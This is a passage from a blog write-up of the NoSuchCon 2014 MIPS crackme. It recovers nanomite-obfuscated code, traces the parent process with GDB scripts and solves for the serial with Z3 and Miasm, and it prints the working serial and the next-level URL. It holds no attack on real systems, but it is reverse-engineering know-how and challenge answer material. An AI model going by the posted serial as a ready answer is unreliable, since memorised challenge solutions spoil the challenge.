</span><span class='line'>                    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
</span><span class='line'>                        <span class="k">print</span> <span class="s">&#39;;&#39;</span><span class="p">,</span> <span class="s">&#39;=&#39;</span><span class="o">*</span><span class="mi">25</span><span class="p">,</span> <span class="s">&#39;BLOCK </span><span class="si">%d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">z</span><span class="p">,</span> <span class="s">&#39;=&#39;</span><span class="o">*</span><span class="mi">25</span>
</span><span class='line'>                        <span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">cleaned_code</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span><span class='line'>                    <span class="k">break</span>
</span><span class='line'>                <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">cleaned_code</span>
</span></code></pre></td></tr></table></div></figure>


<p>And there it is :&ndash;)</p>

<p>The function outputs the unrolled and ordered code of the son. If you want to push further, you could theoretically perform an open-heart surgery to completely remove the nanomites from the original binary, isn&rsquo;t it cool? This is left as an exercise for the interested reader though :&ndash;)).</p>

<h2>Attacking the son: the last man standing</h2>

<p>Now that we have the code unscrambled, we can directly feed it to our engine but before doing so here are some details:</p>

<ul>
<li>As we said earlier, it looks like the son is executing 6 times the same code. This is not the case <strong>at all</strong>, every round will execute the same amount of instructions but not in the same order</li>
<li>The computations executed can be seen as some kind of light encoding/encryption or decoding/decryption algorithm</li>
<li>We have 6 <em>rounds</em> because the input serial is broken into 6 <em>DWORD</em>s (so 6 symbolic variables) ; so basically each round is going to generate an output <em>DWORD</em></li>
</ul>


<p>As previously, we need to copy the code we want to execute. Note that we can also use <em>generate_son_code_reorganized</em> to generate it dynamically. Next step is to configure the virtual environment and we are good to finally run the code:</p>

<figure class='code'><figcaption><span>solve_nsc2014_step1_z3@get_serial first part</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">get_serial</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;&gt; Instantiating the symbolic execution engine..&#39;</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">mini_mips_symexec_engine</span><span class="o">.</span><span class="n">MiniMipsSymExecEngine</span><span class="p">(</span><span class="s">&#39;decrypt_serial.log&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">enable_z3</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;&gt; Generating dynamically the code of the son &amp; reorganizing/cleaning it..&#39;</span>
</span><span class='line'>  <span class="c"># If you don&#39;t want to generate it dynamically like a sir, I&#39;ve copied a version inside</span>
</span><span class='line'>  <span class="c"># code.block_code_of_son_reorganized_loop_unrolled :-)</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">code</span> <span class="o">=</span> <span class="n">generate_son_code_reorganized</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;&gt; Configuring the virtual environement..&#39;</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;fp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7fff6cb0</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">stack_offsets</span><span class="p">[</span><span class="s">&#39;var_30&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">24</span>
</span><span class='line'>  <span class="n">start_addr</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;fp&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">x</span><span class="o">.</span><span class="n">stack_offsets</span><span class="p">[</span><span class="s">&#39;var_30&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span>
</span><span class='line'>  <span class="c"># (gdb) x/6dwx $s8+24+8</span>
</span><span class='line'>  <span class="c"># 0x7fff6cd0:     0x11111111      0x11111111      0x11111111</span>
</span><span class='line'>  <span class="c">#                 0x11111111      0x11111111      0x11111111</span>
</span><span class='line'>  <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">f</span> <span class="o">=</span> <span class="n">BitVecs</span><span class="p">(</span><span class="s">&#39;a b c d e f&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>  <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>  <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">b</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>  <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="n">d</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span> <span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span> <span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;&gt; Running the code..&#39;</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The thing that matters this time is to find <em>a, b, c, d, e, f</em> so that they generate specific outputs ; so this is where <a href="https://z3.codeplex.com/">Z3</a> is going to help us a <strong>lot</strong>. Thanks to that guy we don&rsquo;t need to manually invert the algorithm.</p>

<p>The final bit now is basically just about setting up the solver, setting the correct constraints and generating the serial you guys have been waiting for so long:</p>

<figure class='code'><figcaption><span>solve_nsc2014_step1_z3@get_serial second part</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>  <span class="k">print</span> <span class="s">&#39;&gt; Instantiating &amp; configuring the solver..&#39;</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>   <span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x7953205b</span><span class="p">,</span> <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>   <span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x6b63616e</span><span class="p">,</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>   <span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x20766974</span><span class="p">,</span> <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>  <span class="mi">12</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x534e202b</span><span class="p">,</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>  <span class="mi">16</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x203d2043</span><span class="p">,</span> <span class="n">x</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">start_addr</span> <span class="o">+</span>  <span class="mi">20</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x5d20333c</span><span class="p">,</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;&gt; Solving..&#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;&gt; Constraints solvable, here are the 6 DWORDs:&#39;</span>
</span><span class='line'>    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&#39; </span><span class="si">%r</span><span class="s"> = 0x</span><span class="si">%.8X</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">m</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">())</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;&gt; Serial:&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">((</span><span class="s">&#39;</span><span class="si">%.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">m</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">())[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">f</span><span class="p">))</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;! Constraints unsolvable&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>There we are, the final moment; <em>drum roll</em></p>

<figure class='code'><figcaption><span>python solve_nsc2014_step1_z3.py + YAY</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\Codes\NoSuchCon2014&gt; python .\solve_nsc2014_step1_z3.py
</span><span class='line'>==================================================
</span><span class='line'>Tests OK -- you are fine to go
</span><span class='line'>==================================================
</span><span class='line'>&gt; Instantiating the symbolic execution engine..
</span><span class='line'>&gt; Generating dynamically the code of the son &amp; reorganizing/cleaning it..
</span><span class='line'>&gt; Configuring the virtual environement..
</span><span class='line'>&gt; Running the code..
</span><span class='line'>&gt; Instantiating &amp; configuring the solver..
</span><span class='line'>&gt; Solving..
</span><span class='line'>&gt; Constraints solvable, here are the 6 DWORDs:
</span><span class='line'> a = 0xFE446223
</span><span class='line'> b = 0xBA770149
</span><span class='line'> c = 0x75BA5111
</span><span class='line'> d = 0x78EA3635
</span><span class='line'> e = 0xA9D6E85F
</span><span class='line'> f = 0xCC26C5EF
</span><span class='line'>&gt; Serial: 322644EF941077AB1115AB575363AE87F58E6D9AFE5C62CC
</span><span class='line'>==================================================
</span><span class='line'>
</span><span class='line'>overclok@wildout:~/chall/nsc2014$ ./start_vm.sh
</span><span class='line'>[    0.000000] Initializing cgroup subsys cpuset
</span><span class='line'>[...]
</span><span class='line'>Debian GNU/Linux 7 debian-mipsel ttyS0
</span><span class='line'>
</span><span class='line'>debian-mipsel login: root
</span><span class='line'>Password:
</span><span class='line'>[...]
</span><span class='line'>root@debian-mipsel:~# /home/user/crackmips 322644EF941077AB1115AB575363AE87F58E6D9AFE5C62CC
</span><span class='line'>good job!
</span><span class='line'>Next level is there: http://nsc2014.synacktiv.com:65480/oob4giekee4zaeW9/
</span></code></pre></td></tr></table></div></figure>


<p>Boom :&ndash;).</p>

<h1>Alternative solution</h1>

<p>In this part, I present an alternate solution to solve the challenge. It&rsquo;s somehow a shortcut, since it requires much less coding than Axel&rsquo;s one, and uses the awesome <a href="https://code.google.com/p/miasm/">Miasm</a> framework.</p>

<h2>Shortcut #1 : Tracing the parent with GDB</h2>

<h3>Quick recap of the parent&rsquo;s behaviour</h3>

<p>As Axel has previously explained, the first step is to recover the child&rsquo;s execution flow. Because of <em>nanomites</em>, the child is driven by the parent; we have to analyze the parent (i.e. the <code>debug</code> function) first to determine the correct sequence of the child&rsquo;s <code>pc</code> values.</p>

<p>The parent&rsquo;s main loop is obfuscated, but by browsing cross-references of stack variables in IDA, we can see where each one is used. After a bit of analysis, we can try to decompile by hand the algorithm, and write a pseudo-Python code description of what the <code>debug</code> function does (it is really simplified):</p>

<figure class='code'><figcaption><span>debug_pseudo_code.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">waitpid</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="bp">True</span><span class="p">):</span>
</span><span class='line'>    <span class="n">regs</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">GETREGS</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># big block 1</span>
</span><span class='line'>    <span class="n">addr</span> <span class="o">=</span> <span class="n">regs</span><span class="o">.</span><span class="n">pc</span>
</span><span class='line'>    <span class="n">param</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="n">counter</span><span class="p">)</span>
</span><span class='line'>    <span class="n">addr</span> <span class="o">=</span> <span class="n">obfu1</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">605</span><span class="p">):</span>
</span><span class='line'>        <span class="n">entry</span> <span class="o">=</span> <span class="n">pcs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="c"># entry is 8 bytes long (2 dwords)</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="n">entry</span><span class="o">.</span><span class="n">first_dword</span><span class="p">):</span>
</span><span class='line'>            <span class="n">addr</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="n">second_dword</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># big block 2</span>
</span><span class='line'>    <span class="n">addr</span> <span class="o">=</span> <span class="n">obfu2</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">regs</span><span class="o">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">addr</span>
</span><span class='line'>    <span class="n">ptrace</span><span class="p">(</span><span class="n">SETREGS</span><span class="p">,</span> <span class="n">regs</span><span class="p">)</span>
</span><span class='line'>    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">waitpid</span><span class="p">()):</span>
</span><span class='line'>        <span class="k">break</span>
</span></code></pre></td></tr></table></div></figure>


<p>The &ldquo;big blocks&rdquo; are the two long assembly blocks preceding and following the inner loop. Without looking at the gory details, we understand that a <code>param</code> value is derived from the counter using a function that I call <code>f</code>, and then used to obfuscate the original child&rsquo;s <code>pc</code>. The result is then searched in a <code>pcs</code> array (stored at address <code>0414130</code>), the next dword is extracted and used in a 2nd obfuscation pass to finally produce the new <code>pc</code> value injected into the child.</p>

<p>The most important fact here is that that this process does not involve the input key at anytime. <strong>The output <code>pc</code> sequence is deterministic and constant</strong>; two executions with two different keys will produce the same sequence of <code>pc</code>&rsquo;s. Since we know the first value of <code>pc</code> (the first <code>break</code> instruction at 040228C), we can theoretically compute the correct sequence and then reorder the child&rsquo;s instructions according to this sequence.</p>

<p>We have two approaches for doing so:</p>

<ul>
<li>statical analysis: somehow understand each instruction used in obfuscation passes and rewrite the algorithm producing the correct sequence. This is the <a href="#static_analysis_father">path followed by Axel</a>.</li>
<li>dynamic analysis: trace the program once and log all pc values.</li>
</ul>


<p>Although the first one is probably the most interesting, the second is certainly the fastest. Again, it only works because the input key does not influence the output <code>pc</code> sequence. And we&rsquo;re lucky: the child is already debugged by the parent, but nothing prevents us to debug the parent itself.</p>

<h3>First attempt at tracing</h3>

<p>Tracing is pretty straightforward with GDB using <code>bp</code> and <code>commands</code>. In order to understand the parent&rsquo;s algorithm a bit better, I first wrote a pretty verbose GDB script that prints the loop counter, <code>param</code> variable as well as the original and new child&rsquo;s <code>pc</code> for each iteration. I chose to put two breakpoints:</p>

<ul>
<li>The first one at the end of the first obfuscation blocks (0x401440)</li>
<li>The second one before the <code>ptrace</code> call at the end of the second block (0x0401D8C), in order to be able to read the child&rsquo;s <code>pc</code> manipulated by the parent.</li>
</ul>


<p>Here is the script:</p>

<figure class='code'><figcaption><span>gdb_trace1_script.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>##################################
</span><span class='line'># A few handy functions
</span><span class='line'>##################################
</span><span class='line'>
</span><span class='line'>def print_context_pc
</span><span class='line'>    printf &quot;regs.pc = 0x%08x\n&quot;, *(int*)($fp-0x1cc)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def print_param
</span><span class='line'>    printf &quot;param = 0x%08x\n&quot;, *(int*)($fp-0x2f0)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def print_addr
</span><span class='line'>    printf &quot;addr = 0x%08x\n&quot;, *(int*)($fp-0x2fc)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def print_counter
</span><span class='line'>    printf &quot;counter = %d\n&quot;, *(int*)($fp-0x300)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>##################################
</span><span class='line'>
</span><span class='line'>set pagination off
</span><span class='line'>set confirm off
</span><span class='line'>file crackmips
</span><span class='line'>target remote 127.0.0.1:4444 # gdbserver address
</span><span class='line'>
</span><span class='line'># break at the end of block 1
</span><span class='line'>b *0x401440
</span><span class='line'>commands
</span><span class='line'>silent
</span><span class='line'>printf &quot;\nNew round\n&quot;
</span><span class='line'>print_counter
</span><span class='line'>print_context_pc
</span><span class='line'>print_param
</span><span class='line'>print_addr
</span><span class='line'>c
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'># break before the end of block 2
</span><span class='line'>b *0x0401D8C
</span><span class='line'>commands
</span><span class='line'>silent
</span><span class='line'>print_context_pc
</span><span class='line'>c
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>c
</span></code></pre></td></tr></table></div></figure>


<p>To run that script within GDB, we first need to start <code>crackmips</code> with gdbserver in our <code>qemu</code> VM. After a few minutes, we get the following (cleaned) trace:</p>

<figure class='code'><figcaption><span>gdb_trace1.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>New round
</span><span class='line'>counter = 0
</span><span class='line'>regs.pc = 0x0040228c
</span><span class='line'>param = 0x00000000
</span><span class='line'>addr = 0xcd0e9f0e
</span><span class='line'>regs.pc = 0x00402290
</span><span class='line'>
</span><span class='line'>New round
</span><span class='line'>counter = 1
</span><span class='line'>regs.pc = 0x004022bc
</span><span class='line'>param = 0x00000000
</span><span class='line'>addr = 0xcd0e99ae
</span><span class='line'>regs.pc = 0x00402ce0
</span><span class='line'>
</span><span class='line'>New round
</span><span class='line'>counter = 2
</span><span class='line'>regs.pc = 0x00402d0c
</span><span class='line'>param = 0x00000000
</span><span class='line'>addr = 0xcd0e420e
</span><span class='line'>regs.pc = 0x00402da8
</span><span class='line'>
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>By reading the trace further, we realize that <code>param</code> is always equal to <code>counter/101</code>. This is actually the child&rsquo;s own loop counter, since its big loop is made of 101 pseudo basic blocks. We also notice that the <code>pc</code> sequence is different for each child&rsquo;s loop: round 0 is not equal to round 101, etc.</p>

<h3>Getting a clean trace</h3>

<p>Since we&rsquo;re only interested in the final <code>pc</code> value for each round, we can make a simpler script that just outputs those values. And organize them in a parsable format to be able to use them later in another script. Here is the version 2 of the script:</p>

<figure class='code'><figcaption><span>gdb_trace2_script.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>def print_context_pc
</span><span class='line'>    printf &quot;0x%08x\n&quot;, *(int*)($fp-0x1cc)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>set pagination off
</span><span class='line'>set confirm off
</span><span class='line'>file crackmips
</span><span class='line'>target remote 127.0.0.1:4444
</span><span class='line'>
</span><span class='line'># break before the end of block 2
</span><span class='line'>b *0x0401D8C
</span><span class='line'>commands
</span><span class='line'>silent
</span><span class='line'>print_context_pc
</span><span class='line'>c
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>c
</span></code></pre></td></tr></table></div></figure>


<p>The cleaned trace only contains the 606 <code>pc</code> values, one on each line:</p>

<figure class='code'><figcaption><span>gdb_trace.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0x00402290
</span><span class='line'>0x00402ce0
</span><span class='line'>0x00402da8
</span><span class='line'>0x00403550
</span><span class='line'>[...]
</span><span class='line'>0x004030e4
</span><span class='line'>0x004039dc
</span></code></pre></td></tr></table></div></figure>


<p>Mission 1: accomplished!</p>

<h2>Shortcut #2 : Symbolic execution using Miasm</h2>

<p>We now have the list of each start address of each basic block executed by the child. The next step is to understand what each one of them does, and reorder them to reproduce the whole algorithm.</p>

<p>Even though <a href="#writing_symbolic_exec">writing a symbolic execution engine from scratch</a> is certainly a fun and interesting exercise, I chose to play with <a href="https://code.google.com/p/miasm/">Miasm</a>. This excellent framework can disassemble binaries in various architectures (among which x86, x64, ARM, MIPS, etc.), and convert them into an intermediate language called IR (<em>intermediate representation</em>). It is then able to perform symbolic execution on this IR in order to find what are the side effects of a basic block on registers and memory locations. Although there is not so much documentation, Miasm contains various <a href="https://code.google.com/p/miasm/source/browse/#hg%2Fexample">examples</a> that should make the API easier to dig in. Don&rsquo;t tell me that it is hard to install, it is really not (well, I haven&rsquo;t tried on Windows ;). And there is even a <a href="https://registry.hub.docker.com/u/miasm/base/">docker image</a>, so you have no excuse to not try it!</p>

<h3>Miasm symbolic execution 101</h3>

<p>Before scripting everything, let&rsquo;s first see how to use Miasm to perform symbolic execution of one basic block. For the sake of simplicity, let&rsquo;s work on the first basic block of the child&rsquo;s main loop.</p>

<figure class='code'><figcaption><span>miasm_example.py (1/5)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
